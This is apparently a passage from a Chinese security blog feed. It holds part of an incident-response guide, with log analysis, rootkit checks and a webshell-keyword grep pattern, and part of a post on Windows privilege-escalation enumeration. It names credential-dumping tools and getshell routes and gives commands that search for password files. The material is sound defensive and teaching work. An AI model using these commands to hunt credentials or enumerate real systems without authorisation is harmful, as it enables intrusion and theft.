<li>指定信息检索<br>a) strings命令在对象文件或二进制文件中查找可打印的字符串<br>b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep ‘[1-9]{1,3}.[1-9]{1,3}.’<br>　<strong>PS：此正则不严谨，但匹配IP已够用</strong><br>c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）</li>
<li>查看ssh相关目录有无可疑的公钥存在。<br>a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。<br>b) 目录： /etc/ssh    ./.ssh/</li>
</ul>
<p>4、后门排查<br>除以上文件、进程、系统 分析外，推荐工具：</p>
<blockquote>
<p>chkrootkit  rkhunter（www.chkrootkit.org   rkhunter.sourceforge.net）</p>
</blockquote>
<ul>
<li>chkrootkit<br>(迭代更新了20年)主要功能：<br>　　检测是否被植入后门、木马、rootkit<br>　　检测系统命令是否正常<br>　　检测登录日志<br>　　详细参考README<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/12792542.jpg" alt=""></li>
<li>rkhunter<br>主要功能：<br>　　系统命令（Binary）检测，包括Md5 校验<br>　　Rootkit检测<br>　　本机敏感目录、系统配置、服务及套间异常检测<br>　　三方应用版本检测<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/87352127.jpg" alt=""></li>
<li>RPM check检查<br>　　系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rpm -Va &gt; rpm.log</div></pre></td></tr></table></figure>
</li>
</ul>
<p>　　如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串,  c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。 . (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">5 MD5 校验码</div><div class="line">S 文件尺寸</div><div class="line">L 符号连接</div><div class="line">T 文件修改日期</div><div class="line">D 设备</div><div class="line">U 用户</div><div class="line">G 用户组</div><div class="line">M 模式e (包括权限和文件类型)</div></pre></td></tr></table></figure></p>
<p>借用sobug文章案例：如下图可知ps, pstree, netstat, sshd等等系统关键进程被篡改了<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/63507042.jpg" alt=""></p>
<ul>
<li>Webshell查找<br>　　Webshell的排查可以通过<strong>文件、流量、日志</strong>三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。可根据webshell特征进行命令查找，简单的可使用(当然会存在漏报和误报)<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find /var/www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>综上所述，通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施：</p>
<ul>
<li>根据进程、连接等信息关联的程序，查看木马活动信息。</li>
<li>假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</li>
<li>发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</li>
<li>发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</li>
</ul>
<p>5、日志分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">日志文件 /var/log/message       </div><div class="line">包括整体系统信息 /var/log/auth.log        </div><div class="line">包含系统授权信息，包括用户登录和使用的权限机制等 /var/log/userlog         </div><div class="line">记录所有等级用户信息的日志。 /var/log/cron           </div><div class="line">记录crontab命令是否被正确的执行 /var/log/xferlog(vsftpd.log)</div><div class="line">记录Linux FTP日志 /var/log/lastlog         </div><div class="line">记录登录的用户，可以使用命令lastlog查看 /var/log/secure         </div><div class="line">记录大多数应用输入的账号与密码，登录成功与否 var/log/wtmp　　      </div><div class="line">记录登录系统成功的账户信息，等同于命令last var/log/faillog　记录登录系统不成功的账号信息，一般会被黑客删除</div></pre></td></tr></table></figure></p>
<ul>
<li>日志查看分析，grep,sed,sort,awk综合运用</li>
<li>基于时间的日志管理：<br>　　/var/log/wtmp<br>　　/var/run/utmp<br>　　/var/log/lastlog(lastlog)<br>　　/var/log/btmp(lastb)</li>
<li>登录日志可以关注Accepted、Failed password 、invalid特殊关键字</li>
<li><p>登录相关命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lastlog 记录最近几次成功登录的事件和最后一次不成功的登录    </div><div class="line">who 命令查询utmp文件并报告当前登录的每个用户。Who的缺省输出包括用户名、终端类型、登录日期及远程主机    </div><div class="line">w 命令查询utmp文件并显示当前系统中每个用户和它所运行的进程信息    </div><div class="line">users 用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数    </div><div class="line">last 命令往回搜索wtmp来显示自从文件第一次创建以来登录过的用户    </div><div class="line">finger 命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。</div></pre></td></tr></table></figure>
</li>
<li><p>几个语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  #定位有多少IP在爆破主机的root帐号       </div><div class="line">grep &quot;Accepted &quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  #登录成功的IP有哪些         </div><div class="line">tail -400f demo.log  #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）      less demo.log  #查看日志文件，支持上下滚屏，查找功能      </div><div class="line">uniq -c demo.log  #标记该行重复的数量，不重复值为1    </div><div class="line">grep -c &apos;ERROR&apos; demo.log  #输出文件demo.log中查找所有包行ERROR的行的数量</div></pre></td></tr></table></figure>
</li>
</ul>
<p>6、相关处置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">kill -9</div><div class="line">chattr –i</div><div class="line">rm</div><div class="line">setfacl</div><div class="line">ssh</div><div class="line">chmod</div></pre></td></tr></table></figure></p>
<h4 id="0x02-Windows系列分析排查"><a href="#0x02-Windows系列分析排查" class="headerlink" title="0x02 Windows系列分析排查"></a>0x02 Windows系列分析排查</h4><p>1、文件分析</p>
<ul>
<li>开机启动有无异常文件</li>
<li>各个盘下的temp(tmp)相关目录下查看有无异常文件</li>
<li>浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</li>
<li>查看文件时间，创建时间、修改时间、访问时间。<br>　　对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</li>
<li>查看用户recent相关文件，通过分析最近打开分析可疑文件<br>　　a) C:\Documents and Settings\Administrator\Recent<br>　　b) C:\Documents and Settings\Default User\Recent<br>　　c) 开始,运行   %UserProfile%\Recent</li>
<li>根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件件<br>Server 2008 R2系列<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/51943553.jpg" alt=""><br>Win10系列<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/55788321.jpg" alt=""></li>
<li>关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字（比如博彩类），可以在IIS 日志中进行过滤匹配，比如经常使用:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">知道是上传目录，在web log 中查看指定时间范围包括上传文件夹的访问请求 : findstr /s /m /I “UploadFiles” *.log</div><div class="line">某次博彩事件中的六合彩信息是six.js: findstr /s /m /I “six.js” *.aspx</div><div class="line">根据shell名关键字去搜索D盘spy相关的文件有哪些 :for /r d:\ %i in (*spy*.aspx) do @echo %i</div></pre></td></tr></table></figure>
</li>
</ul>
<p>2、进程命令</p>
<ul>
<li>netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</li>
<li>根据netstat 定位出的pid，再通过tasklist命令进行进程定位<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/65298749.jpg" alt=""></li>
<li>通过tasklist命令查看可疑程序</li>
</ul>
<p>3、系统信息</p>
<ul>
<li>使用set命令查看变量的设置</li>
<li>Windows 的计划任务；</li>
<li>Windows 的帐号信息，如隐藏帐号等</li>
<li>配套的注册表信息检索查看，SAM文件以及远控软件类</li>
<li>查看systeminfo 信息，系统版本以及补丁信息<br>例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）…<br>若进行漏洞比对，建议使用Windows-Exploit-Suggester<br><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/" target="_blank" rel="external">https://github.com/GDSSecurity/Windows-Exploit-Suggester/</a></li>
</ul>
<p>4、后门排查<br>PC Hunter是一个Windows系统信息查看软件<br><a href="http://www.xuetr.com/" target="_blank" rel="external">http://www.xuetr.com/</a><br>功能列表如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能</div><div class="line">2.内核驱动模块查看，支持内核驱动模块的内存拷贝</div><div class="line">3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook</div><div class="line">4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除</div><div class="line">5.端口信息查看，目前不支持2000系统</div><div class="line">6.查看消息钩子</div><div class="line">7.内核模块的iat、eat、inline hook、patches检测和恢复</div><div class="line">8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除</div><div class="line">9.注册表编辑</div><div class="line">10.进程iat、eat、inline hook、patches检测和恢复</div><div class="line">11.文件系统查看，支持基本的文件操作</div><div class="line">12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME</div><div class="line">13.ObjectType Hook检测和恢复</div><div class="line">14.DPC定时器检测和删除</div><div class="line">15.MBR Rootkit检测和修复</div><div class="line">16.内核对象劫持检测</div><div class="line">17.WorkerThread枚举</div><div class="line">18.Ndis中一些回调信息枚举</div><div class="line">19.硬件调试寄存器、调试相关API检测</div><div class="line">20.枚举SFilter/Fltmgr的回调</div></pre></td></tr></table></figure></p>
<p><strong>PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/93373789.jpg" alt=""></p>
<p>5、后门排查</p>
<ul>
<li>可以使用hm</li>
<li>也可以使用盾类（D盾、暗组盾），如果可以把web目录导出，可以在自己虚拟机进行分析<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/27229232.jpg" alt=""></li>
</ul>
<p>6、日志分析</p>
<ul>
<li>打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）</li>
<li>主要分析安全日志，可以借助自带的筛选功能<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/14268899.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/38480079.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/86908955.jpg" alt=""></li>
<li>可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/11899177.jpg" alt=""></p>
<ul>
<li>强大的日志分析工具Log Parser<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/68829847.jpg" alt=""><br>分析IIS日志<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/75777904.jpg" alt=""><br>　　有了这些我们就可以对windows日志进行分析了 比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675&quot;</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/75777904.jpg" alt=""><br>事件ID是很好的索引<br>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p>
<p>7、相关处置<br>　　通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)<br>　　木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除<br>　　最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p>
<h4 id="0x03-应用类"><a href="#0x03-应用类" class="headerlink" title="0x03 应用类"></a>0x03 应用类</h4><p><strong>Apache、tomcat、Nginx、IIS</strong><br>　　无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:</p>
<ul>
<li>find . access_log |grep xargs ip攻击地址</li>
<li>find . access_log| grep xargs 木马文件名</li>
<li>cat access.log | cut -f1 -d “ “ | sort | uniq -c | sort -k 1 -r | head -10 页面访问排名前十的IP</li>
<li>cat access.log | cut -f4 -d “ “ | sort | uniq -c | sort -k 1 -r | head -10 页面访问排名前十的URL</li>
<li>cat access.log | sort -k 2 -n -r | head 10 查看最耗时的页面<br>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。<br>1、首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/58627823.jpg" alt=""><br>2、一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/62810890.jpg" alt=""></li>
</ul>
<h3 id="0x04-应急总结"><a href="#0x04-应急总结" class="headerlink" title="0x04 应急总结"></a>0x04 应急总结</h3><ul>
<li>核心思路是“顺藤摸瓜”</li>
<li>碎片信息的关联分析</li>
<li>时间范围的界定以及关键操作时间点串联</li>
<li>Web入侵类，shell定位很重要</li>
<li>假设与求证</li>
<li>攻击画像与路线确认</li>
</ul>
<h3 id="0x05-渗透反辅"><a href="#0x05-渗透反辅" class="headerlink" title="0x05 渗透反辅"></a>0x05 渗透反辅</h3><p>1、密码读取<br>a) Windows: Mimikatz<br>b) Linux: mimipenguin<br>2、帐号信息<br>a) 操作系统帐号<br>b) 数据库帐号<br>c) 应用帐号信息<br>3、敏感信息<br>a) 配置信息<br>b) 数据库信息<br>c) 服务端口信息<br>d) 指纹信息<br>4、滚雪球式线性拓展<br>a) 密码口令类拓展（远控）<br>b) 典型漏洞批量利用<br>5、常见的入侵方式Getshell方法<br>a) WEB入侵<br>　　i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell<br>　　ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞<br>b) 系统入侵<br>　　i. SSH 破解后登录操作<br>　　ii. RDP 破解后登录操作<br>　　iii. MSSQL破解后远控操作<br>　　iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）<br>c) 典型应用<br>　　i. Mail暴力破解后信息挖掘及漏洞利用<br>　　ii. VPN暴力破解后绕过边界<br>　　iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行<br>　　iv. Rsync 未授权访问类<br>　　v. Mongodb未授权访问类<br>　　vi. Elasticsearch命令执行漏洞<br>　　vii. Memcache未授权访问漏洞<br>　　viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p>
<h3 id="0x06-资源参考"><a href="#0x06-资源参考" class="headerlink" title="0x06 资源参考"></a>0x06 资源参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">https://www.waitalone.cn/linux-find-webshell.html</div><div class="line">http://vinc.top/category/yjxy/</div><div class="line">http://www.shellpub.com/</div><div class="line">http://linux.vbird.org/linux_security/0420rkhunter.php</div><div class="line">https://cisofy.com/download/lynis/</div><div class="line">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</div><div class="line">http://www.freebuf.com/articles/web/23358.html</div><div class="line">https://www.microsoft.com/en-us/download/details.aspx?id=24659</div><div class="line">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</div><div class="line">http://wooyun.jozxing.cc/static/drops/tips-7462.html</div><div class="line">http://bobao.360.cn/learning/detail/3830.html</div><div class="line">https://yq.aliyun.com/ziliao/65679</div><div class="line">http://secsky.sinaapp.com/188.html</div><div class="line">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</div><div class="line">http://www.sleuthkit.org/autopsy/</div></pre></td></tr></table></figure>
<p>转载连接：<a href="https://xianzhi.aliyun.com/forum/read/1655.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/1655.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-事件分类&quot;&gt;&lt;a href=&quot;#0x00-事件分类&quot; class=&quot;headerlink&quot; title=&quot;0x00 事件分类&quot;&gt;&lt;/a&gt;0x00 事件分类&lt;/h3&gt;&lt;p&gt;常见的安全事件：&lt;br&gt;　　Web入侵：挂马、篡改、Webshell&lt;br&gt;　　系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞&lt;br&gt;　　病毒木马：远控、后门、勒索软件&lt;br&gt;　　信息泄漏：拖裤、数据库登录（弱口令）&lt;br&gt;　　网络流量：频繁发包、批量请求、DDOS攻击&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="应急响应" scheme="http://yoursite.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>windows权限提升基础</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/05/19/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80.html"/>
    <id>http://yoursite.com/渗透/2017/05/19/windows权限提升基础.html</id>
    <published>2017-05-19T13:50:40.000Z</published>
    <updated>2017-05-30T04:40:14.226Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-获取操作系统信息"><a href="#0x01-获取操作系统信息" class="headerlink" title="0x01 获取操作系统信息"></a>0x01 获取操作系统信息</h3><ul>
<li><p>识别操作系统名称及版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>识别系统体系结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo %PROCESSOR_ARCHITECTURE%</div></pre></td></tr></table></figure>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>查看所有环境变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET</div></pre></td></tr></table></figure>
</li>
<li><p>查看在线用户，有时候低权限看不到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">query user</div></pre></td></tr></table></figure>
</li>
<li><p>查询终端端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</div></pre></td></tr></table></figure>
</li>
<li><p>查看某特定用户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net user test</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x02-获取网络信息"><a href="#0x02-获取网络信息" class="headerlink" title="0x02 获取网络信息"></a>0x02 获取网络信息</h3><ul>
<li><p>查看路由表信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route print</div></pre></td></tr></table></figure>
</li>
<li><p>查看ARP缓存信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arp -a</div></pre></td></tr></table></figure>
</li>
<li><p>查看网络连接和防火墙规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netstat -ano</div><div class="line">netsh firewall show config</div><div class="line">netsh firewall show state</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x03-应用程序及服务信息"><a href="#0x03-应用程序及服务信息" class="headerlink" title="0x03 应用程序及服务信息"></a>0x03 应用程序及服务信息</h3><ul>
<li><p>查看计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /QUERY /fo LIST /v</div></pre></td></tr></table></figure>
</li>
<li><p>查看服务进程ID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tasklist /SVC</div></pre></td></tr></table></figure>
</li>
<li><p>查看已经启动Windows 服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net start</div></pre></td></tr></table></figure>
</li>
<li><p>查看安装驱动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DRIVERQUERY</div></pre></td></tr></table></figure>
</li>
<li><p>查看安装程序和版本信息（漏洞利用线索）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic product list brief</div></pre></td></tr></table></figure>
</li>
<li><p>查看服务、进程和启动程序信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div><div class="line">wmic process list brief</div><div class="line">wmic startup list brief</div></pre></td></tr></table></figure>
</li>
<li><p>查看服务权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc qc mysqla</div></pre></td></tr></table></figure>
</li>
<li><p>查看安装补丁和时间信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div></pre></td></tr></table></figure>
</li>
<li><p>查看特定漏洞补丁信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x04-敏感数据和目录"><a href="#0x04-敏感数据和目录" class="headerlink" title="0x04 敏感数据和目录"></a>0x04 敏感数据和目录</h3><ul>
<li>查找密码文件或其它敏感文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cd/</div><div class="line">dir /b/s password.txt # Will search for all password.txt files on the filesystem.</div><div class="line">dir /b/s config.* # Will search for all files starting with &apos;config&apos; on the filesystem.</div><div class="line">findstr /si password *.xml *.ini *.txt</div><div class="line">findstr /si login *.xml *.ini *.txt</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x05-文件系统"><a href="#0x05-文件系统" class="headerlink" title="0x05 文件系统"></a>0x05 文件系统</h3><ul>
<li><p>打包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rar a -k -r -s -m3 c:\1.rar c:\folde</div></pre></td></tr></table></figure>
</li>
<li><p>检查文件夹可写状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir /a-r-d /s /b</div></pre></td></tr></table></figure>
</li>
</ul>
<p>参考：<a href="http://www.goldfire.cc/index.php/archives/660" target="_blank" rel="external">http://www.goldfire.cc/index.php/archives/660</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-获取操作系统信息&quot;&gt;&lt;a href=&quot;#0x01-获取操作系统信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 获取操作系统信息&quot;&gt;&lt;/a&gt;0x01 获取操作系统信息&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;识别操作系统名称及版本&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;systeminfo | findstr /B /C:&amp;quot;OS 名称&amp;quot; /C:&amp;quot;OS 版本&amp;quot;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;识别系统体系结构&lt;/p&gt;
